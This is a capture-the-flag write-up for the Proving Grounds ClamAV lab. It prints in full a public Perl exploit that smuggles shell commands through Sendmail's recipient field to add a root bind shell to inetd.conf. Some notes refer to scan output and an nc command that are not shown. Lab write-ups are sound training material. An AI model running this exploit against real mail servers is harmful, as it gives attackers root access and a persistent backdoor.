
# ClamAV — Proving Grounds

> [!abstract] Summary
> A legacy Debian host exposes Sendmail and SNMP. The SNMP process list reveals `clamav-milter` running in black-hole mode; the documented Sendmail/clamav-milter exploit then adds a root bind shell to `inetd.conf` on TCP 31337. The captured session reaches `root` directly, so there is no separate privilege escalation step.

**Target:** `192.168.143.42` (as used in the primary scan and SNMP output)  
**OffSec machine page:** https://portal.offsec.com/machine/clamav-179/overview/details

## Methodology

1. Scan all TCP ports and identify exposed services.
2. Enumerate SNMP to inspect system details and running processes.
3. Identify the ClamAV milter process and search for a matching public exploit.
4. Use the Sendmail exploit and connect to the resulting bind shell.

## Exploitation

### Remote Code Execution

A public exploit search reveals a [Remote Command Execution](https://www.exploit-db.com/exploits/4761) vulnerability.

Following the exploit, let's create the following Perl file:

```
kali@kali:~$ cat 4761.pl
#!/usr/bin/perl

use IO::Socket::INET;

print "Sendmail w/ clamav-milter Remote Root Exploit\n"; print "Copyright (C) 2007 Eliteboy\n";
if ($#ARGV != 0) {print "Give me a host to connect.\n";exit;} print "Attacking $ARGV[0]...\n";
$sock = IO::Socket::INET->new(PeerAddr => $ARGV[0],
                                PeerPort => '25',
                                Proto    => 'tcp');
print $sock "ehlo you\r\n";
print $sock "mail from: <>\r\n";
print $sock "rcpt to: <nobody+\"|echo '31337 stream tcp nowait root /bin/sh -i' >> /etc/inetd.conf\"@localhost>\r\n";
print $sock "rcpt to: <nobody+\"|/etc/init.d/inetd restart\"@localhost>\r\n"; print $sock "data\r\n.\r\nquit\r\n";
  while (<$sock>) {
          print;
}
```

## Escalation

Since we've gained access as root, we don't need to escalate our privileges.

## Findings and lessons learned

- A public SNMP community string (`public`) exposed a detailed process list, including executable paths and arguments. Process arguments can disclose security-relevant configuration even when no credentials are present.
- The exploit relies on the vulnerable Sendmail/ClamAV milter configuration, then writes an `inetd` service entry and restarts `inetd`; the resulting shell is root.
- The original notes contain inconsistent target addresses in the exploit transcript: the invocation is `192.168.143.42`, while the printed “Attacking” line and the later `nc` example refer to `192.168.120.144`. The pasted SMTP output also has another historical subnet. These are preserved as captured; use the current target IP consistently when reproducing the steps.
- The opening reminder to rerun a scan and revert the machine if ports appear missing is retained above. The scan output itself reports a retransmission cap warning, so verifying an unexpected port result with a second scan is sensible.
